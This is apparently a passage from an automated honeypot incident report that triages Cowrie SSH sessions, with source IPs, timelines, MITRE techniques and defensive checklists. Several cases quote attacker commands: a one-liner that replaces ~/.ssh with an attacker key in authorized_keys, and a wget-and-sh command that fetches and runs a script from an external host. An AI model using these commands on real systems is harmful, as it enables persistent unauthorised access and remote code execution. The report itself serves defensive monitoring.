| `2026-11-26 05:23:47` | `cowrie.log.closed` |
| `2026-11-26 05:23:47` | `cowrie.session.params` |
| `2026-11-26 05:23:47` | `cowrie.command.input` |
| `2026-11-26 05:23:48` | `cowrie.session.file_download` |
| `2026-11-26 05:23:48` | `cowrie.log.closed` |
| `2026-11-26 05:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-982786cf5b39

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-11-26 05:23 |
| **Last Seen** | 2026-11-26 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:23:48` | `cowrie.session.connect` |
| `2026-11-26 05:23:48` | `cowrie.client.version` |
| `2026-11-26 05:23:48` | `cowrie.client.kex` |
| `2026-11-26 05:23:49` | `cowrie.login.success` |
| `2026-11-26 05:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cae219988b32

| Field | Detail |
|---|---|
| **Source IP** | `117.33.242[.]50` |
| **First Seen** | 2026-11-26 05:24 |
| **Last Seen** | 2026-11-26 05:29 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:24:32` | `cowrie.session.connect` |
| `2026-11-26 05:24:32` | `cowrie.client.version` |
| `2026-11-26 05:24:32` | `cowrie.client.kex` |
| `2026-11-26 05:24:34` | `cowrie.login.success` |
| `2026-11-26 05:29:34` | `cowrie.session.file_upload` |
| `2026-11-26 05:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.33.242[.]50` to AbuseIPDB if not already reported
- [ ] Block `117.33.242[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e735df26e03

| Field | Detail |
|---|---|
| **Source IP** | `23.185.200[.]28` |
| **First Seen** | 2026-11-26 05:41 |
| **Last Seen** | 2026-11-26 05:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:41:52` | `cowrie.session.connect` |
| `2026-11-26 05:41:52` | `cowrie.client.version` |
| `2026-11-26 05:41:52` | `cowrie.client.kex` |
| `2026-11-26 05:41:53` | `cowrie.login.success` |
| `2026-11-26 05:41:53` | `cowrie.session.params` |
| `2026-11-26 05:41:53` | `cowrie.command.input` |
| `2026-11-26 05:41:53` | `cowrie.command.failed` |
| `2026-11-26 05:41:53` | `cowrie.log.closed` |
| `2026-11-26 05:41:54` | `cowrie.session.params` |
| `2026-11-26 05:41:54` | `cowrie.command.input` |
| `2026-11-26 05:41:54` | `cowrie.session.file_download` |
| `2026-11-26 05:41:54` | `cowrie.log.closed` |
| `2026-11-26 05:41:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.185.200[.]28` to AbuseIPDB if not already reported
- [ ] Block `23.185.200[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd194c2aaeb7

| Field | Detail |
|---|---|
| **Source IP** | `23.185.200[.]28` |
| **First Seen** | 2026-11-26 05:41 |
| **Last Seen** | 2026-11-26 05:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 05:41:54` | `cowrie.session.connect` |
| `2026-11-26 05:41:54` | `cowrie.client.version` |
| `2026-11-26 05:41:54` | `cowrie.client.kex` |
| `2026-11-26 05:41:54` | `cowrie.login.success` |
| `2026-11-26 05:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.185.200[.]28` to AbuseIPDB if not already reported
- [ ] Block `23.185.200[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-438ea730d6d2

| Field | Detail |
|---|---|
| **Source IP** | `103.143.239[.]254` |
| **First Seen** | 2026-11-26 06:01 |
| **Last Seen** | 2026-11-26 06:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:01:43` | `cowrie.session.connect` |
| `2026-11-26 06:01:43` | `cowrie.client.version` |
| `2026-11-26 06:01:43` | `cowrie.client.kex` |
| `2026-11-26 06:01:43` | `cowrie.login.success` |
| `2026-11-26 06:01:44` | `cowrie.session.params` |
| `2026-11-26 06:01:44` | `cowrie.command.input` |
| `2026-11-26 06:01:44` | `cowrie.command.failed` |
| `2026-11-26 06:01:44` | `cowrie.log.closed` |
| `2026-11-26 06:01:45` | `cowrie.session.params` |
| `2026-11-26 06:01:45` | `cowrie.command.input` |
| `2026-11-26 06:01:45` | `cowrie.session.file_download` |
| `2026-11-26 06:01:45` | `cowrie.log.closed` |
| `2026-11-26 06:01:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.239[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.143.239[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe1de033023

| Field | Detail |
|---|---|
| **Source IP** | `103.143.239[.]254` |
| **First Seen** | 2026-11-26 06:01 |
| **Last Seen** | 2026-11-26 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:01:45` | `cowrie.session.connect` |
| `2026-11-26 06:01:45` | `cowrie.client.version` |
| `2026-11-26 06:01:45` | `cowrie.client.kex` |
| `2026-11-26 06:01:45` | `cowrie.login.success` |
| `2026-11-26 06:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.239[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.143.239[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d02f4054454

| Field | Detail |
|---|---|
| **Source IP** | `217.60.242[.]22` |
| **First Seen** | 2026-11-26 06:17 |
| **Last Seen** | 2026-11-26 06:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `xc3511, cd /tmp;wget -qO .x "hxxp://217.60.242[.]22:8080/i" 2>/dev/null;[ -s .x ] && { sh .x </dev/null >/dev/null 2>&1 & echo LAND_WGET; }` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:17:37` | `cowrie.session.connect` |
| `2026-11-26 06:17:37` | `cowrie.login.success` |
| `2026-11-26 06:17:37` | `cowrie.session.params` |
| `2026-11-26 06:17:38` | `cowrie.command.input` |
| `2026-11-26 06:17:38` | `cowrie.command.failed` |
| `2026-11-26 06:17:38` | `cowrie.command.input` |
| `2026-11-26 06:17:38` | `cowrie.log.closed` |
| `2026-11-26 06:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.242[.]22` to AbuseIPDB if not already reported
- [ ] Block `217.60.242[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca08d0ca254d

| Field | Detail |
|---|---|
| **Source IP** | `187.230.113[.]226` |
| **First Seen** | 2026-11-26 06:23 |
| **Last Seen** | 2026-11-26 06:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:23:44` | `cowrie.session.connect` |
| `2026-11-26 06:23:44` | `cowrie.client.version` |
| `2026-11-26 06:23:44` | `cowrie.client.kex` |
| `2026-11-26 06:23:45` | `cowrie.login.success` |
| `2026-11-26 06:23:45` | `cowrie.session.params` |
| `2026-11-26 06:23:45` | `cowrie.command.input` |
| `2026-11-26 06:23:45` | `cowrie.command.failed` |
| `2026-11-26 06:23:46` | `cowrie.log.closed` |
| `2026-11-26 06:23:46` | `cowrie.session.params` |
| `2026-11-26 06:23:46` | `cowrie.command.input` |
| `2026-11-26 06:23:46` | `cowrie.session.file_download` |
| `2026-11-26 06:23:46` | `cowrie.log.closed` |
| `2026-11-26 06:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.230.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `187.230.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32323d9eef94

| Field | Detail |
|---|---|
| **Source IP** | `187.230.113[.]226` |
| **First Seen** | 2026-11-26 06:23 |
| **Last Seen** | 2026-11-26 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:23:46` | `cowrie.session.connect` |
| `2026-11-26 06:23:46` | `cowrie.client.version` |
| `2026-11-26 06:23:46` | `cowrie.client.kex` |
| `2026-11-26 06:23:47` | `cowrie.login.success` |
| `2026-11-26 06:23:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.230.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `187.230.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a770594a3268

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-26 06:27 |
| **Last Seen** | 2026-11-26 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:27:10` | `cowrie.session.connect` |
| `2026-11-26 06:27:10` | `cowrie.client.version` |
| `2026-11-26 06:27:10` | `cowrie.client.kex` |
| `2026-11-26 06:27:10` | `cowrie.login.success` |
| `2026-11-26 06:27:10` | `cowrie.direct-tcpip.request` |
| `2026-11-26 06:27:10` | `cowrie.direct-tcpip.data` |
| `2026-11-26 06:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e442bfb1b1

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-11-26 06:27 |
| **Last Seen** | 2026-11-26 06:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:27:33` | `cowrie.session.connect` |
| `2026-11-26 06:27:33` | `cowrie.client.version` |
| `2026-11-26 06:27:34` | `cowrie.client.kex` |
| `2026-11-26 06:27:35` | `cowrie.login.success` |
| `2026-11-26 06:27:36` | `cowrie.session.params` |
| `2026-11-26 06:27:36` | `cowrie.command.input` |
| `2026-11-26 06:27:36` | `cowrie.command.failed` |
| `2026-11-26 06:27:36` | `cowrie.log.closed` |
| `2026-11-26 06:27:37` | `cowrie.session.params` |
| `2026-11-26 06:27:37` | `cowrie.command.input` |
| `2026-11-26 06:27:37` | `cowrie.session.file_download` |
| `2026-11-26 06:27:37` | `cowrie.log.closed` |
| `2026-11-26 06:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1d8095a7ed9

| Field | Detail |
|---|---|
| **Source IP** | `197.227.8[.]186` |
| **First Seen** | 2026-11-26 06:27 |
| **Last Seen** | 2026-11-26 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-26 06:27:38` | `cowrie.session.connect` |
| `2026-11-26 06:27:38` | `cowrie.client.version` |
| `2026-11-26 06:27:38` | `cowrie.client.kex` |
| `2026-11-26 06:27:39` | `cowrie.login.success` |
| `2026-11-26 06:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.227.8[.]186` to AbuseIPDB if not already reported
- [ ] Block `197.227.8[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (213) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-17e980c54a08 | HIGH | `109.91.4[.]177` | 2026-11-26 06:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6232e6c72451 | HIGH | `109.91.4[.]177` | 2026-11-26 06:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7ef803b55a33 | HIGH | `103.154.158[.]60` | 2026-11-26 06:44 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-3d451481c9c3 | HIGH | `66.228.53[.]46` | 2026-11-26 06:45 | Y | 3 | 0 | `T1078` |
| IR-87b0dd2a0ad8 | HIGH | `78.128.112[.]74` | 2026-11-26 07:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b652ac0368a9 | HIGH | `138.226.239[.]234` | 2026-11-26 07:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ba9cea1e096d | HIGH | `138.226.239[.]233` | 2026-11-26 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9231e85e9d5a | HIGH | `82.38.134[.]89` | 2026-11-26 07:15 | Y | 8 | 0 | `T1078 · T1110.001 · T1592` |
| IR-60a2bc81aa55 | HIGH | `116.176.61[.]136` | 2026-11-26 07:44 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d5f9ee30cc88 | HIGH | `83.98.196[.]175` | 2026-11-26 07:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8da654e77eba | HIGH | `83.98.196[.]175` | 2026-11-26 07:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-daa4f30ebd33 | HIGH | `84.8.222[.]8` | 2026-11-26 07:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3d1ae473b4d2 | HIGH | `84.8.222[.]8` | 2026-11-26 07:55 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-0090f024d834 | HIGH | `84.8.222[.]8` | 2026-11-26 07:55 | Y | 1 | 0 | `T1021.004 · T1057 · T1078` |
| IR-e033a93c710e | HIGH | `84.8.222[.]8` | 2026-11-26 07:55 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-23bbbcc7bbb4 | HIGH | `217.60.240[.]247` | 2026-11-26 07:56 | Y | 4 | 0 | `T1078` |
| IR-26c26f68c91d | HIGH | `211.46.177[.]174` | 2026-11-26 07:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4364e68fd650 | HIGH | `211.46.177[.]174` | 2026-11-26 07:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b43a3847087f | HIGH | `161.118.210[.]55` | 2026-11-26 08:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-de394c0a713e | HIGH | `79.3.96[.]178` | 2026-11-26 08:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-424c86a2b9e6 | HIGH | `79.3.96[.]178` | 2026-11-26 08:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-06c06d6ebf2b | HIGH | `138.124.124[.]212` | 2026-11-26 08:13 | Y | 0 | 0 | `T1078` |
| IR-a3d0a79b63a6 | HIGH | `176.53.159[.]196` | 2026-11-26 08:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-718fd08250c8 | HIGH | `88.96.39[.]28` | 2026-11-26 08:32 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
| IR-b98129c8e08c | HIGH | `179.190.190[.]170` | 2026-11-26 08:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-325d53f85b73 | HIGH | `179.190.190[.]170` | 2026-11-26 08:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db7087255f8f | HIGH | `117.62.22[.]127` | 2026-11-26 08:53 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-06f6310ed2a0 | HIGH | `36.255.97[.]39` | 2026-11-26 09:05 | Y | 0 | 0 | `T1078` |
| IR-39822e2ce2d2 | HIGH | `77.90.185[.]29` | 2026-11-26 09:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ccd553d8a0df | HIGH | `138.226.239[.]234` | 2026-11-26 09:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cd110e993790 | HIGH | `35.210.220[.]9` | 2026-11-26 09:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-04e2d2392db4 | HIGH | `185.180.141[.]54` | 2026-11-26 09:51 | Y | 3 | 0 | `T1078` |
| IR-3655ab7ac79a | HIGH | `109.160.32[.]130` | 2026-11-26 09:52 | Y | 1 | 0 | `T1078 · T1592` |
| IR-fd8a165ca22b | HIGH | `109.160.32[.]130` | 2026-11-26 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-9cee2bec554e | HIGH | `193.32.162[.]84` | 2026-11-26 10:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5efd1487228d | HIGH | `193.32.162[.]84` | 2026-11-26 10:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d2fd6ce49fe5 | HIGH | `144.22.238[.]238` | 2026-11-26 10:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c5fac877a334 | HIGH | `193.32.162[.]84` | 2026-11-26 10:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-84d10321c560 | HIGH | `193.32.162[.]84` | 2026-11-26 10:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9cfb6b04f6c2 | HIGH | `193.32.162[.]84` | 2026-11-26 10:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c55bf9ce2215 | HIGH | `193.32.162[.]84` | 2026-11-26 10:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c9d5ec4b5b4f | HIGH | `84.8.222[.]8` | 2026-11-26 10:28 | Y | 1 | 1 | `T1078 · T1105 · T1592` |
| IR-90abe2cbae39 | HIGH | `84.8.222[.]8` | 2026-11-26 10:28 | Y | 1 | 1 | `T1059.004 · T1078 · T1105` |
| IR-adeb755aa273 | HIGH | `36.64.190[.]82` | 2026-11-26 10:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8bed551f8e6b | HIGH | `193.32.162[.]84` | 2026-11-26 10:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d5fdc95d7cd7 | HIGH | `36.64.190[.]82` | 2026-11-26 10:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1eeecba3ef0a | HIGH | `84.8.222[.]8` | 2026-11-26 10:30 | Y | 1 | 1 | `T1059.004 · T1078 · T1105` |
| IR-b20a03242868 | HIGH | `84.8.222[.]8` | 2026-11-26 10:30 | Y | 1 | 1 | `T1078 · T1105 · T1592` |
| IR-a64defb8087e | HIGH | `84.8.222[.]8` | 2026-11-26 10:30 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-faac0a761406 | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c94a9984022e | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-16ae7ace562c | HIGH | `177.75.235[.]46` | 2026-11-26 10:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-27ca3aa363c5 | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 1 | `T1003.008 · T1078 · T1083` |
| IR-3bd167feb7f7 | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5f23c17c0532 | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 0 | `T1057 · T1078 · T1083` |
| IR-aff75171bb9f | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 1 | `T1078 · T1105 · T1592` |
| IR-1a1ed464cc09 | HIGH | `193.32.162[.]84` | 2026-11-26 10:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5cd5e8cf9f92 | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 1 | `T1059.004 · T1078 · T1083` |
| IR-eb69a127484b | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 5 | 1 | `T1078 · T1105 · T1592` |
| IR-d3d331a48272 | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 2 | 0 | `T1078 · T1592` |
| IR-5c85fb2b5594 | HIGH | `84.8.222[.]8` | 2026-11-26 10:31 | Y | 1 | 1 | `T1059.004 · T1078 · T1083` |
| IR-da1daeb89e9c | HIGH | `84.8.222[.]8` | 2026-11-26 10:32 | Y | 1 | 1 | `T1059.004 · T1078 · T1105` |
| IR-547caffcd3d4 | HIGH | `84.8.222[.]8` | 2026-11-26 10:32 | Y | 1 | 0 | `T1003.008 · T1078 · T1083` |
| IR-1da4b5045f4d | HIGH | `181.78.234[.]66` | 2026-11-26 10:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-511b047630f1 | HIGH | `181.78.234[.]66` | 2026-11-26 10:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5ff9e899d001 | HIGH | `84.8.222[.]8` | 2026-11-26 10:32 | Y | 12 | 0 | `T1003.008 · T1078 · T1083` |
| IR-8c2e65fc62a6 | HIGH | `84.8.222[.]8` | 2026-11-26 10:32 | Y | 1 | 0 | `T1078 · T1083 · T1592` |
| IR-62acfd0e2dfc | HIGH | `163.52.135[.]28` | 2026-11-26 10:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d9328070485b | HIGH | `193.32.162[.]84` | 2026-11-26 10:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b0ffe4c77628 | HIGH | `84.8.222[.]8` | 2026-11-26 10:33 | Y | 10 | 0 | `T1078 · T1083 · T1592` |
| IR-609c81f710b5 | HIGH | `84.8.222[.]8` | 2026-11-26 10:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-43419c666b53 | HIGH | `84.8.222[.]8` | 2026-11-26 10:35 | Y | 1 | 1 | `T1078 · T1105 · T1592` |
| IR-e3f97087b446 | HIGH | `193.32.162[.]84` | 2026-11-26 10:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-97d643a3ae3f | HIGH | `84.8.222[.]8` | 2026-11-26 10:36 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c3eb16b70e92 | HIGH | `84.8.222[.]8` | 2026-11-26 10:37 | Y | 1 | 2 | `T1078 · T1105 · T1592` |
| IR-6f592a668f7f | HIGH | `193.32.162[.]84` | 2026-11-26 10:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
